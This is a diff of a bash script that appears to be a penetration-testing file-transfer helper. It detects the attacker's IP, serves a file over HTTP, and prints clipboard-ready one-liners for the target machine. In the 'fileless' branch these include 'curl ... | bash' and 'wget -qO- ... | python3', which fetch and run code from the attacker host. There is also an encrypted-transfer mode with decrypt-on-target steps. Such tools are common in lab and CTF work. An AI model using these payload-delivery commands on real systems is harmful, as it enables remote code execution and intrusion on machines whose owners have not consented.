@@ -49,32 +49,37 @@ if [[ -z "$FILE" || ! -f "$FILE" ]]; then
   exit 1
 fi
 
-IP="${attacker:-}"
+
+IP="${IP:-}"
+
 
 # 1) try tun0 if not provided
 if [[ -z "$IP" ]]; then
-  IP="$(ip -br addr show dev tun0 2>/dev/null | awk '{print $3}' | cut -d/ -f1)"
+  IP="$( ip -br addr show dev tun0 2>/dev/null \
+        | awk '{print $3}' | cut -d/ -f1 || true )"
+  [[ -n "$IP" ]]
 fi
 
-# 2) try default-route source IP (best guess for "machine IP" when bridged/NAT)
+
+# 2) default-route source IP
 if [[ -z "$IP" ]]; then
-  # ip route get 1.1.1.1 outputs e.g.: "1.1.1.1 via ... src 192.168.1.71 dev eth0"
-  IP="$(ip route get 1.1.1.1 2>/dev/null | awk '{
-    for(i=1;i<=NF;i++) if ($i=="src") { print $(i+1); exit }
-  }')"
+  IP="$( ip route get 1.1.1.1 2>/dev/null \
+        | awk '{for(i=1;i<=NF;i++) if ($i=="src") {print $(i+1); exit}}' || true )"
+  [[ -n "$IP" ]]
 fi
 
-# 3) final fallback: first non-loopback global IPv4 address
+# 3) first non-loopback global IPv4
 if [[ -z "$IP" ]]; then
-  IP="$(ip -4 -br addr show scope global 2>/dev/null | awk '{print $3}' | cut -d/ -f1 | head -n1)"
+  IP="$( ip -4 -br addr show scope global 2>/dev/null \
+        | awk '{print $3}' | cut -d/ -f1 | head -n1 || true )"
+  [[ -n "$IP" ]]
 fi
 
+
 if [[ -z "$IP" ]]; then
-  echo "[-] Could not determine an attacker/machine IP. Export \$attacker, connect VPN (tun0), or ensure an interface has an IPv4 address." >&2
+  echo "[-] Could not determine an attacker/machine IP. Export \$IP, connect VPN (tun0), or ensure an interface has an IPv4 address." >&2
   exit 1
 fi
-
-
 
 
 BASE="$(basename "$FILE")"
@@ -96,6 +101,8 @@ case "$CASE" in
   
   http)
     echo -e "${MAGENTA}=== HTTP ==="
+
+    
     if [[ -n "${DROP_CREATED_TMP:-}" ]]; then
       # We created a tarball from a directory — show the streaming extract helper only
       echo -e "${COLOR}wget -qO- http://${IP}:${PORT}/${BASE} | tar xz -C .${RESET}"
@@ -116,32 +123,37 @@ case "$CASE" in
     ;;
 
   fileless)
+
+
     echo -e "${MAGENTA}=== Fileless ==="
-        if [[  "$BASE" == *.sh ]]; then
+        case "$BASE" in
+
+      *.sh)
         echo -e "${COLOR}wget -qO- http://${IP}:${PORT}/${BASE} | bash${RESET}"
         echo -e "${COLOR}curl http://${IP}:${PORT}/${BASE} | bash${RESET}"
         echo "curl http://${IP}:${PORT}/${BASE} | bash" | xclip -selection clipboard
         echo -e "${GREEN}→ curl helper copied to clipboard"
-        fi
-      
-        if [[  "$BASE" == *.py ]]; then
+        ;;
+        
+        *.py)      
         echo -e "${COLOR}wget -qO- http://${IP}:${PORT}/${BASE} | python3${RESET}"
         echo -e "${COLOR}curl http://${IP}:${PORT}/${BASE} | python3${RESET}"
         echo "curl http://${IP}:${PORT}/${BASE} | python3" | xclip -selection clipboard
         echo -e "${GREEN}→ curl helper copied to clipboard"
+        ;;
         
-        else
-         echo -e "${RED}→Not an executable script (unknown or unsupported extension): ${BASE}${RESET}"
-         echo -e "${RED}→Falling back to regular HTTP download (no fileless execution).${RESET}"
-         echo -e "${COLOR}wget -qO- http://${IP}:${PORT}/${BASE} | tar xz -C .${RESET}"
-         echo -e "${COLOR}curl -s http://${IP}:${PORT}/${BASE} | tar xz -C .${RESET}"
-         echo "curl -s http://${IP}:${PORT}/${BASE} | tar xz -C ." | xclip -selection clipboard
-         echo -e "${GREEN}→ curl helper copied to clipboard"
-        fi
+        *)
+        echo -e "${RED}→Not an executable script (unknown or unsupported extension): ${BASE}${RESET}"
+        echo -e "${RED}→Falling back to regular HTTP download (no fileless execution).${RESET}"
+        echo -e "${COLOR}wget http://${IP}:${PORT}/${BASE} -O ${BASE}${RESET}"
+        echo -e "${COLOR}curl -o ${BASE} http://${IP}:${PORT}/${BASE}${RESET}"
+        echo -e "curl -o ${BASE} http://${IP}:${PORT}/${BASE}" | xclip -selection clipboard
+        echo -e "${GREEN}→ curl helper copied to clipboard"
+      ;;
+      esac
 
     echo
     echo -e "${YELLOW}[*] Serving ${BASE} at http://${IP}:${PORT}/ (Ctrl-C to stop)"
-
     python3 -m http.server "$PORT" --bind 0.0.0.0
     ;;
    
@@ -163,9 +175,8 @@ case "$CASE" in
 
 
   encrypted)
-    echo -e "${MAGENTA}=== Encrypted ==="
+    echo -e "${MAGENTA}=== Encrypted ===${COLOR}"
     DIR="$(cd "$(dirname "$FILE")" 2>/dev/null && pwd || pwd)"
-    echo -e "${RED}[*] Encrypting ${BASE} → ${BASE}.enc${RESET}"
     openssl enc -aes256 -pbkdf2 -in "${FILE}" -out "${DIR}/${BASE}.enc"
     echo
     echo -e "${COLOR}wget http://${IP}:${PORT}/${BASE}.enc -O ${BASE}.enc${RESET}"
@@ -173,6 +184,7 @@ case "$CASE" in
     echo "curl -s http://${IP}:${PORT}/${BASE}.enc -o ${BASE}.enc" | xclip -selection clipboard
     echo -e "${GREEN}→ (curl helper copied to clipboard)"
     echo
+    echo -e "${MAGENTA}Decrypt on target with: "
     echo -e "${COLOR}openssl enc -d -aes256 -pbkdf2 -in ${BASE}.enc -out ${BASE}${RESET}"
     echo
     echo -e "${YELLOW}[*] Serving ${BASE}.enc at http://${IP}:${PORT}/"
